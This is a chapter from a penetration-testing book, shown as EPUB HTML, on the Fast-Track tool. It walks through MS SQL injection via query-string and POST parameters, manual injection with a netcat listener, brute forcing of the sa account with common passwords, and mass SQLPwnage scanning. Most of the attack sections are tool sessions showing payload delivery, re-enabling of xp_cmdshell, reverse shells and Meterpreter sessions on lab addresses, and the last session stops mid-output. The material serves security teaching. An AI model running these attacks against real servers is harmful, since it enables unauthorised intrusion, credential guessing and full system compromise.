<html><head></head><body><section epub:type="chapter" id="fast-track"><div class="titlepage"><div class="book"><div class="book"><h2 class="title1">Chapter 11. Fast-Track</h2></div></div></div><p class="calibre2">Fast-Track is an open source Python-based tool for augmenting advanced penetration testing techniques. Fast-Track uses the Metasploit Framework for payload delivery and client-side attack vectors. It complements Metasploit by adding additional features, including Microsoft SQL attacks, more exploits, and browser attack vectors. Fast-Track was created by Dave Kennedy, with contributions from Andrew Weidenhamer, John Melvin, and Scott White. It is currently updated and maintained by Joey Furr (j0fer).<a id="IDX-CHP-11-0001" class="strong"/><a id="IDX-CHP-11-0002" class="strong"/><a id="IDX-CHP-11-0003" class="strong"/><a id="IDX-CHP-11-0004" class="strong"/><a id="IDX-CHP-11-0005" class="strong"/><a id="IDX-CHP-11-0006" class="strong"/><a id="IDX-CHP-11-0007" class="strong"/></p><p class="calibre2">Fast-Track’s interactive mode is the way to use it. To enter interactive mode, as shown below, use <strong class="calibre3"><code class="calibre6">./fast-track.py -i</code></strong> (which is similar to the command used by SET). By issuing different options and sequences, you can customize your attack, targets, and more. (You can also use <code class="literal">./fast-track.py -g</code> to load the web interface.)</p><a id="I_programlisting11_d1e13098" class="strong"/><pre class="programlisting">oot@bt4:/pentest/exploits/fasttrack# <strong class="calibre3"><code class="calibre6">./fast-track.py -i</code></strong>

 ***********************************************
 ******* Performing dependency checks... *******
 ***********************************************

 *** FreeTDS and PYMMSQL are installed. (Check) ***
 *** PExpect is installed. (Check) ***
 *** ClientForm is installed. (Check) ***
 *** Psyco is installed. (Check) ***
 *** Beautiful Soup is installed. (Check) ***
 *** PyMills is installed. (Check) ***

 Also ensure ProFTP, WinEXE, and SQLite3 is installed from
 the Updates/Installation menu.

 Your system has all requirements needed to run Fast-Track!

 Fast-Track Main Menu:

 Fast-Track - Where it's OK to finish in under 3 minutes...
 Version: v4.0
 Written by: David Kennedy (ReL1K)

 1.  Fast-Track Updates
 2.  Autopwn Automation
 3.  Microsoft SQL Tools
 4.  Mass Client-Side Attack
 5.  Exploits
 6.  Binary to Hex Payload Converter
 7.  Payload Generator
 8.  Fast-Track Tutorials
 9.  Fast-Track Changelog
 10. Fast-Track Credits
 11. Exit

 Enter the number:</pre><p class="calibre2">You can see the general categories of attacks and features in Fast-Track’s main menu above though we’ll only cover selected ones in this chapter. We’ll explore some of the most useful tricks, with an emphasis on exploiting Microsoft SQL. For example, the Autopwn Automation menu simplifies the process of Metasploit’s autopwn functionality — simply enter the IP address, and Fast-Track sets up everything for you. The Exploits menu contains additional exploits not included in Metasploit.<a id="IDX-CHP-11-0008" class="strong"/><a id="IDX-CHP-11-0009" class="strong"/><a id="IDX-CHP-11-0010" class="strong"/><a id="IDX-CHP-11-0011" class="strong"/></p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="microsoft_sql_injection">Microsoft SQL Injection</h2></div></div></div><p class="calibre2"><span class="strong"><em class="calibre4">SQL injection (SQLi) attacks</em></span> piggyback SQL commands to assault web applications by exploiting insecure code. A SQL query can be inserted into the backend database via a trusted web server to execute commands on the database. Fast-Track automates the process of performing advanced SQL injection attacks by focusing on query string and POST parameters within web applications. The following attack relies on the attacker knowing that SQL injection is present on the target website, and also knowing which parameter is vulnerable. This attack will work only on MS SQL–based systems.<a id="IDX-CHP-11-0012" class="strong"/><a id="IDX-CHP-11-0013" class="strong"/><a id="IDX-CHP-11-0014" class="strong"/><a id="IDX-CHP-11-0015" class="strong"/><a id="IDX-CHP-11-0016" class="strong"/><a id="IDX-CHP-11-0017" class="strong"/><a id="IDX-CHP-11-0018" class="strong"/></p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="sql_injectormquery_string_attack">SQL Injector — Query String Attack</h3></div></div></div><p class="calibre2">Begin the setup for the attack by selecting <code class="literal">Microsoft SQL Tools</code> from the main menu and then <code class="literal">MSSQL Injector</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13168" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>, as shown below.</p><a id="I_programlisting11_d1e13174" class="strong"/><pre class="programlisting">Pick a list of the tools from below:

<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> 1. MSSQL Injector
  2. MSSQL Bruter
  3. SQLPwnage

  Enter your choice : <strong class="calibre3"><code class="calibre6">1</code></strong></pre><p class="calibre2">The simplest form of SQL injection is within the query string, typically sent in the URL field from the browser to the server. This URL string can often contain parameters that inform a dynamic site what information is being requested. Fast-Track distinguishes which field to attack by inserting an '<code class="literal">INJECTHERE</code> into the vulnerable query string parameter, like this:</p><a id="I_programlisting11_d1e13189" class="strong"/><pre class="programlisting">http://www.secmaniac.com/index.asp?id='INJECTHERE&amp;date=2011</pre><p class="calibre2">When Fast-Track starts to exploit this vulnerability, it will look for the <code class="literal">id</code> string in all fields to determine which field to attack. Let’s look at this in action by selecting the first option, <code class="literal">Query String Parameter Attack</code>.</p><a id="I_programlisting11_d1e13199" class="strong"/><pre class="programlisting">Enter which SQL Injector you want to use

<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> 1. SQL Injector - Query String Parameter Attack
  2. SQL Injector - POST Parameter Attack
  3. SQL Injector - GET FTP Payload Attack
  4. SQL Injector - GET Manual Setup Binary Payload Attack

  Enter your choice: <strong class="calibre3"><code class="calibre6">1</code></strong>

  <strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

  Enter the URL of the susceptible site, remember to put 'INJECTHERE for the
  injectable parameter

  Example:http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&amp;password=blah

<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> Enter here: <strong class="calibre3"><code class="calibre6">http://www.secmaniac.com/index.asp?id='INJECTHERE&amp;date=2011</code></strong>
  Sending initial request to enable xp_cmdshell if disabled...
  Sending first portion of payload (1/4)...
  Sending second portion of payload (2/4)...
  Sending third portion of payload (3/4)...
  Sending the last portion of the payload (4/4)...
  Running cleanup before executing the payload...
  Running the payload on the server...Sending initial request to enable
  xp_cmdshell if disabled...
  Sending first portion of payload (1/4)...
  Sending second portion of payload (2/4)...
  Sending third portion of payload (3/4)...
  Sending the last portion of the payload (4/4)...
  Running cleanup before executing the payload...
  Running the payload on the server...
  listening on [any] 4444 ...
  connect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1041
  Microsoft Windows [Version 5.2.3790]
  (C) Copyright 1985-2003 Microsoft Corp.

  C:\WINDOWS\system32&gt;</pre><p class="calibre2">Success! Full access was granted to the system, all through SQL injection.<a id="IDX-CHP-11-0019" class="strong"/><a id="IDX-CHP-11-0020" class="strong"/><a id="IDX-CHP-11-0021" class="strong"/></p><p class="calibre2">Note that this attack will not succeed if parameterized SQL queries or stored procedures are in use. Note, too, that the required configuration for this attack is very minimal. After selecting <code class="literal">SQL Injector - Query String Parameter Attack</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13238" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> from the menu of attacks, you simply direct Fast-Track to the point of SQL injection <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13244" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>. If the <code class="literal">xp_cmdshell</code> stored procedure is disabled, Fast-Track will automatically re-enable it and attempt privilege escalation of MS SQL.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="sql_injectormpost_parameter_attack">SQL Injector — POST Parameter Attack</h3></div></div></div><p class="calibre2">Fast-Track’s POST parameter attack requires even less configuration than the preceding query string parameter attack. For this attack, simply pass Fast-Track the URL of the website you want to attack, and it will automatically detect the form to attack.<a id="IDX-CHP-11-0022" class="strong"/><a id="IDX-CHP-11-0023" class="strong"/></p><a id="I_programlisting11_d1e13272" class="strong"/><pre class="programlisting">Enter which SQL Injector you want to use

1. SQL Injector - Query String Parameter Attack
2. SQL Injector - POST Parameter Attack
3. SQL Injector - GET FTP Payload Attack
4. SQL Injector - GET Manual Setup Binary Payload Attack

Enter your choice: <strong class="calibre3"><code class="calibre6">2</code></strong>

This portion allows you to attack all forms on a specific
 website without having to specify
each parameter. Just type the URL in, and Fast-Track will auto
 SQL inject to each parameter
looking for both error based injection as well as blind
 based SQL injection. Simply type
the website you want to attack, and let it roll.

Example: http://www.sqlinjectablesite.com/index.aspx

Enter the URL to attack: <strong class="calibre3"><code class="calibre6">http://www.secmaniac.com</code></strong>

Forms detected...attacking the parameters in hopes of exploiting SQL Injection..

Sending payload to parameter: txtLogin

Sending payload to parameter: txtPassword

[-] The PAYLOAD is being delivered. This can take up to two minutes. [-]

listening on [any] 4444 ...
connect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1041
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32&gt;</pre><p class="calibre2">As you can see, Fast-Track handled the automatic detection of the POST parameters and injected the attack, completely compromising the affected system via SQL injection.<a id="IDX-CHP-11-0024" class="strong"/><a id="IDX-CHP-11-0025" class="strong"/></p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">You can also use FTP to deliver your payload, although FTP is generally blocked on outbound-based connections.</p></div><div class="book"><hr class="calibre5"/></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="manual_injection">Manual Injection</h3></div></div></div><p class="calibre2">If you have a different IP address listening for the reverse shell or you need to fine-tune some of the configuration settings, you can set up the injector manually.</p><a id="I_programlisting11_d1e13304" class="strong"/><pre class="programlisting">Enter which SQL Injector you want to use

  1. SQL Injector - Query String Parameter Attack
  2. SQL Injector - POST Parameter Attack
  3. SQL Injector - GET FTP Payload Attack
<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> 4. SQL Injector - GET Manual Setup Binary Payload Attack

  Enter your choice: <strong class="calibre3"><code class="calibre6">4</code></strong>

  The manual portion allows you to customize your attack for whatever reason.

  You will need to designate where in the URL the SQL Injection is by using
  'INJECTHERE

  So for example, when the tool asks you for the SQL Injectable URL, type:

  http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&amp;password=blah

  Enter the URL of the susceptible site, remember to put 'INJECTHERE for the
  injectible parameter

  Example: http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&amp;password=blah

<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> Enter here: <strong class="calibre3"><code class="calibre6">http://www.secmaniac.com/index.asp?id=</code></strong>'<strong class="calibre3"><code class="calibre6">INJECTHERE&amp;date=2010</code></strong>
<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> Enter the IP Address of server with NetCat Listening: <strong class="calibre3"><code class="calibre6">10.211.55.130</code></strong>
<img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/> Enter Port number with NetCat listening: <strong class="calibre3"><code class="calibre6">9090</code></strong>

  Sending initial request to enable xp_cmdshell if disabled....
  Sending first portion of payload....
  Sending second portion of payload....
  Sending next portion of payload...
  Sending the last portion of the payload...
  Running cleanup...
  Running the payload on the server...
  listening on [any] 9090 ...
  10.211.55.128: inverse host lookup failed: Unknown server error : Connection
       timed out
  connect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1045
  Microsoft Windows [Version 5.2.3790]
  (C) Copyright 1985-2003 Microsoft Corp.

  C:\WINDOWS\system32&gt;</pre><p class="calibre2">First choose the manual option at <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13348" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>. Then, as in the query string parameter attack, point Fast-Track to the parameter vulnerable to SQL injection <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13354" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> and input your listening IP address at <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13360" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> along with the port you want your target to connect to at <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13366" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span>. Fast-Track takes care of the rest.<a id="IDX-CHP-11-0026" class="strong"/><a id="IDX-CHP-11-0027" class="strong"/><a id="IDX-CHP-11-0028" class="strong"/><a id="IDX-CHP-11-0029" class="strong"/><a id="IDX-CHP-11-0030" class="strong"/><a id="IDX-CHP-11-0031" class="strong"/><a id="IDX-CHP-11-0032" class="strong"/><a id="IDX-CHP-11-0033" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="mssql_bruter">MSSQL Bruter</h3></div></div></div><p class="calibre2">Perhaps one of the best aspects of Fast-Track is the <span class="strong"><em class="calibre4">MSSQL Bruter</em></span> (available from the Microsoft SQL Attack Tools menu). When MS SQL is installed, MSSQL Bruter can use integrated Windows authentication, SQL authentication, or mixed-mode authentication.<a id="IDX-CHP-11-0034" class="strong"/></p><p class="calibre2">Mixed-mode authentication allows users to be verified from Windows authentication as well as directly from the MS SQL Server. If mixed-mode or SQL authentication is used during the installation of MS SQL, the administrator installing the software needs to specify an <span class="strong"><em class="calibre4">sa</em></span>, or system administrator, account for MS SQL. Often, administrators choose a weak, blank, or easily guessable password that can be used to an attacker’s advantage. If the <span class="strong"><em class="calibre4">sa</em></span> account can be brute forced, it will lead to a compromise of the entire system through the extended stored procedure <code class="literal">xp_cmdshell</code>.</p><p class="calibre2">Fast-Track uses a few methods for discovery when looking for MS SQL servers, including using <span class="strong"><em class="calibre4">nmap</em></span> to perform port scans of the default MS SQL TCP port 1433. If the target machine is using MS SQL Server 2005 or later, dynamic port ranges can be used, which makes it more difficult to enumerate, but Fast-Track directly interfaces with Metasploit and can look for port 1434 User Datagram Protocol (UDP) to reveal which port MS SQL server’s dynamic port is running.<a id="IDX-CHP-11-0035" class="strong"/><a id="IDX-CHP-11-0036" class="strong"/><a id="IDX-CHP-11-0037" class="strong"/></p><p class="calibre2">Once Fast-Track has identified a server and successfully brute forced the <span class="strong"><em class="calibre4">sa</em></span> account, it will use advanced binary-to-hex conversion methods to deliver a payload. This attack is usually highly successful, especially in large environments where MS SQL is widely used.</p><p class="calibre2">Here’s the initial attack:<a id="IDX-CHP-11-0038" class="strong"/><a id="IDX-CHP-11-0039" class="strong"/><a id="IDX-CHP-11-0040" class="strong"/><a id="IDX-CHP-11-0041" class="strong"/><a id="IDX-CHP-11-0042" class="strong"/><a id="IDX-CHP-11-0043" class="strong"/><a id="IDX-CHP-11-0044" class="strong"/><a id="IDX-CHP-11-0045" class="strong"/></p><a id="I_programlisting11_d1e13476" class="strong"/><pre class="programlisting">Microsoft SQL Attack Tools

Pick a list of the tools from below:

1. MSSQL Injector
2. MSSQL Bruter
3. SQLPwnage

Enter your choice : <strong class="calibre3"><code class="calibre6">2</code></strong>

  Enter the IP Address and Port Number to Attack.

  Options: (a)ttempt SQL Ping and Auto Quick Brute Force
           (m)ass scan and dictionary brute
           (s)ingle Target (Attack a Single Target with big dictionary)
           (f)ind SQL Ports (SQL Ping)
           (i) want a command prompt and know which system is vulnerable
           (v)ulnerable system, I want to add a local admin on the box...
           (e)nable xp_cmdshell if its disabled (sql2k and sql2k5)</pre><p class="calibre2">After we select the <code class="literal">MSSQL Bruter</code> option, Fast-Track presents us with a list of various attacks that can be conducted. Not all of these will work in every situation, or even serve the same purpose, so it is important to be sure that you understand what is happening for each option.</p><p class="calibre2">Fast-Track has several options:</p><div class="book"><ul class="itemizedlist"><li class="listitem">Attempt SQL Ping and Auto Quick Brute Force attempts to scan a range of IP addresses using the same syntax as <span class="strong"><em class="calibre4">nmap</em></span> and a built-in predefined dictionary list of about 50 passwords.</li><li class="listitem">Mass scan and dictionary brute scans a range of IP addresses and allows you to specify a word list of your own. Fast-Track comes with a decent word list located at <span class="strong"><em class="calibre4">bin/dict/wordlist.txt</em></span>.</li><li class="listitem">Single Target allows you to brute force one specific IP address with a large word list.</li><li class="listitem">Find SQL Ports (SQL Ping) only looks for SQL servers and will not attack them.</li><li class="listitem">I want a command prompt . . . spawns a command prompt for you if you already know the <span class="strong"><em class="calibre4">sa</em></span> password.</li><li class="listitem">Vulnerable system . . . adds a new administrative user on a box that you know to be vulnerable.</li><li class="listitem">Enable <code class="literal">xp_cmdshell</code> . . . is a stored procedure Fast-Track uses to execute underlying system commands. By default, it is disabled in SQL Server versions 2005 and later, but Fast-Track can automatically re-enable it. When attacking a remote system with any option, Fast-Track will automatically attempt to re-enable <code class="literal">xp_cmdshell</code>, just in case.</li></ul></div><p class="calibre2">You can use and customize several options to reach your target, the easiest of which is the quick brute force, which will often go undetected. We’ll select the quick brute force option using a subset of built-in passwords and attempt to guess the password on the MS SQL server.</p><a id="I_programlisting11_d1e13528" class="strong"/><pre class="programlisting">Enter the IP Address and Port Number to Attack.

<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>   Options: (a)ttempt SQL Ping and Auto Quick Brute Force
             (m)ass scan and dictionary brute
             (s)ingle Target (Attack a Single Target with big dictionary)
             (f)ind SQL Ports (SQL Ping)
             (i) want a command prompt and know which system is vulnerable
             (v)ulnerable system, I want to add a local admin on the box...
             (e)nable xp_cmdshell if its disabled (sql2k and sql2k5)

    Enter Option: <strong class="calibre3"><code class="calibre6">a</code></strong>
<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> Enter username for SQL database (example:sa): <strong class="calibre3"><code class="calibre6">sa</code></strong>
  Configuration file not detected, running default path.
  Recommend running setup.py install to configure Fast-Track.
  Setting default directory...
<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> Enter the IP Range to scan for SQL Scan (example 192.168.1.1-255):
       <strong class="calibre3"><code class="calibre6">10.211.55.1/24</code></strong>

  Do you want to perform advanced SQL server identification on non-standard
  SQL ports? This will use UDP footprinting in order to determine where the SQL
  servers are at. This could take quite a long time.

<img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/> Do you want to perform advanced identification, yes or no: <strong class="calibre3"><code class="calibre6">yes</code></strong>

  [-] Launching SQL Ping, this may take a while to footprint.... [-]

  [*] Please wait while we load the module tree...
  Brute forcing username: sa

  Be patient this could take awhile...

  Brute forcing password of password2 on IP 10.211.55.128:1433
  Brute forcing password of  on IP 10.211.55.128:1433
  Brute forcing password of password on IP 10.211.55.128:1433

  SQL Server Compromised: "sa" with password of: "password" on IP
  10.211.55.128:1433

  Brute forcing password of sqlserver on IP 10.211.55.128:1433
  Brute forcing password of sql on IP 10.211.55.128:1433
  Brute forcing password of password1 on IP 10.211.55.128:1433
  Brute forcing password of password123 on IP 10.211.55.128:1433
  Brute forcing password of complexpassword on IP 10.211.55.128:1433
  Brute forcing password of database on IP 10.211.55.128:1433
  Brute forcing password of server on IP 10.211.55.128:1433
  Brute forcing password of changeme on IP 10.211.55.128:1433
  Brute forcing password of change on IP 10.211.55.128:1433
  Brute forcing password of sqlserver2000 on IP 10.211.55.128:1433
  Brute forcing password of sqlserver2005 on IP 10.211.55.128:1433
  Brute forcing password of Sqlserver on IP 10.211.55.128:1433
  Brute forcing password of SqlServer on IP 10.211.55.128:1433
  Brute forcing password of Password1 on IP 10.211.55.128:1433

  <strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

  *******************************************
  The following SQL Servers were compromised:
  *******************************************

  1. 10.211.55.128:1433 *** U/N: sa P/W: password ***

  *******************************************

  To interact with system, enter the SQL Server number.

  Example: 1. 192.168.1.32 you would type 1

  Enter the number:</pre><p class="calibre2">After selecting Attempt SQL Ping and Auto Quick Brute Force at <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13572" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>, you will be prompted for a SQL database username <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13578" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>, followed by the range of IP addresses you want to scan at <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13584" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>. Answer <strong class="calibre3"><code class="calibre6">yes</code></strong> when asked whether you want to perform advanced server identification <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13593" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span>. Although slow, this can be very effective.</p><p class="calibre2">The preceding output shows that Fast-Track successfully brute forced a system with the username of <span class="strong"><em class="calibre4">sa</em></span> and password <span class="strong"><em class="calibre4">password</em></span>. At this point, you can select the payload and compromise the system, as shown here.</p><a id="I_programlisting11_d1e13607" class="strong"/><pre class="programlisting">Enter number here: <strong class="calibre3"><code class="calibre6">1</code></strong>

Enabling: XP_Cmdshell...
Finished trying to re-enable xp_cmdshell stored procedure if disabled.

Configuration file not detected, running default path.
Recommend running setup.py install to configure Fast-Track.
Setting default directory...
What port do you want the payload to connect to you on: <strong class="calibre3"><code class="calibre6">4444</code></strong>
Metasploit Reverse Meterpreter Upload Detected..
Launching Meterpreter Handler.
Creating Metasploit Reverse Meterpreter Payload..
Sending payload: c88f3f9ac4bbe0e66da147e0f96efd48dad6
Sending payload: ac8cbc47714aaeed2672d69e251cee3dfbad
Metasploit payload delivered..
Converting our payload to binary, this may take a few...
Cleaning up...
Launching payload, this could take up to a minute...
When finished, close the metasploit handler window to return to other
compromised SQL Servers.
[*] Please wait while we load the module tree...
[*] Handler binding to LHOST 0.0.0.0
[*] Started reverse handler
[*] Starting the payload handler...
[*] Transmitting intermediate stager for over-sized stage...(216 bytes)
[*] Sending stage (718336 bytes)
[*] Meterpreter session 1 opened (10.211.55.130:4444 -&gt; 10.211.55.128:1030)

meterpreter &gt;</pre><p class="calibre2">You should now have full access to the machine using the Meterpreter payload.<a id="IDX-CHP-11-0046" class="strong"/><a id="IDX-CHP-11-0047" class="strong"/><a id="IDX-CHP-11-0048" class="strong"/><a id="IDX-CHP-11-0049" class="strong"/><a id="IDX-CHP-11-0050" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="sqlpwnage">SQLPwnage</h3></div></div></div><p class="calibre2"><span class="strong"><em class="calibre4">SQLPwnage</em></span> is a mass brute force attack that can be used against web applications in an attempt to find Microsoft SQL injection. SQLPwnage will scan subnets for web servers on port 80, crawl websites, and attempt to fuzz post parameters until it finds SQL injection. It supports both error- and blind-based SQL injection and will handle everything from privilege escalation to re-enabling the <code class="literal">xp_cmdshell</code> stored procedure, bypassing the Windows debug 64KB restriction, and dropping any payload you want onto the system.<a id="IDX-CHP-11-0051" class="strong"/><a id="IDX-CHP-11-0052" class="strong"/></p><p class="calibre2">Begin the configuration for this attack by selecting <code class="literal">Microsoft SQL Tools</code> from the Fast-Track main menu, followed by <code class="literal">SQLPwnage</code>, option 2, as shown below.</p><a id="I_programlisting11_d1e13664" class="strong"/><pre class="programlisting">SQLPwnage Main Menu:


  1. SQL Injection Search/Exploit by Binary Payload Injection (BLIND)
<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> 2. SQL Injection Search/Exploit by Binary Payload Injection (ERROR BASED)
  3. SQL Injection single URL exploitation

  Enter your choice: <strong class="calibre3"><code class="calibre6">2</code></strong>

  <strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

  Scan a subnet or spider single URL?

  1. url
<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> 2. subnet (new)
  3. subnet (lists last scan)

  Enter the Number: <strong class="calibre3"><code class="calibre6">2</code></strong>

  Enter the ip range, example 192.168.1.1-254: <strong class="calibre3"><code class="calibre6">10.211.55.1-254</code></strong>
  Scanning Complete!!! Select a website to spider or spider all??

  1. Single Website
<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> 2. All Websites

  Enter the Number: <strong class="calibre3"><code class="calibre6">2</code></strong>

  Attempting to Spider: http://10.211.55.128
  Crawling http://10.211.55.128 (Max Depth: 100000)
  DONE
  Found 0 links, following 0 urls in 0+0:0:0
  Spidering is complete.

  *************************************************************************
  http://10.211.55.128
  *************************************************************************

  [+] Number of forms detected: 2 [+]

<img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/> A SQL Exception has been encountered in the "txtLogin" input field of the
       above website.</pre><p class="calibre2">Depending on whether the website presents an error when SQL injection attempts are made, you will need to choose between <code class="literal">BLIND</code> and <code class="literal">ERROR BASED</code> attacks. At <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13714" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> we choose <code class="literal">ERROR BASED</code> because the site is kind enough to report back error messages when it has trouble executing a SQL query.<a id="IDX-CHP-11-0053" class="strong"/><a id="IDX-CHP-11-0054" class="strong"/><a id="IDX-CHP-11-0055" class="strong"/><a id="IDX-CHP-11-0056" class="strong"/></p><p class="calibre2">Next, choose either to spider a single URL or to scan a complete subnet <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13752" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>. After scanning the subnet, we choose to attack all the sites Fast-Track found <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13758" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>. As you can see, scanning all the sites found a vulnerable form <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13764" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> on one site.</p><p class="calibre2">The final configuration steps require that you select a payload. In the following example, you select <code class="literal">Metasploit Meterpreter Reflective Reverse TCP</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13775" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> along with the port at <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13781" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> that you want your attacking machine to listen on. After Fast-Track has successfully exploited the SQL injection vulnerability, it sends a chunked payload <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13787" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> to the target and eventually presents you with your Meterpreter shell <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13793" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span>.</p><a id="I_programlisting11_d1e13799" class="strong"/><pre class="programlisting">What type of payload do you want?

  1. Custom Packed Fast-Track Reverse Payload (AV Safe)
  2. Metasploit Reverse VNC Inject (Requires Metasploit)
  3. Metasploit Meterpreter Payload (Requires Metasploit)
  4. Metasploit TCP Bind Shell (Requires Metasploit)
  5. Metasploit Meterpreter Reflective Reverse TCP
  6. Metasploit Reflective Reverse VNC

<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> Select your choice: <strong class="calibre3"><code class="calibre6">5</code></strong>
<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> Enter the port you want to listen on: <strong class="calibre3"><code class="calibre6">9090</code></strong>
  [+] Importing 64kb debug bypass payload into Fast-Track... [+]
  [+] Import complete, formatting the payload for delivery.. [+]
  [+] Payload Formatting prepped and ready for launch. [+]
  [+] Executing SQL commands to elevate account permissions. [+]
  [+] Initiating stored procedure: 'xp_cmdhshell' if disabled. [+]
  [+] Delivery Complete. [+]
  Created by msfpayload (http://www.metasploit.com).
  Payload: windows/patchupmeterpreter/reverse_tcp
  Length: 310
  Options: LHOST=10.211.55.130,LPORT=9090
  Launching MSFCLI Meterpreter Handler
  Creating Metasploit Reverse Meterpreter Payload..
  Taking raw binary and converting to hex.
  Raw binary converted to straight hex.
<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> [+] Bypassing Windows Debug 64KB Restrictions. Evil. [+]

  <strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

  Running cleanup before launching the payload....
  [+] Launching the PAYLOAD!! This may take up to two or three minutes. [+]
  [*] Please wait while we load the module tree...
  [*] Handler binding to LHOST 0.0.0.0
  [*] Started reverse handler
  [*] Starting the payload handler...
  [*] Transmitting intermediate stager for over-sized stage...(216 bytes)
  [*] Sending stage (2650 bytes)
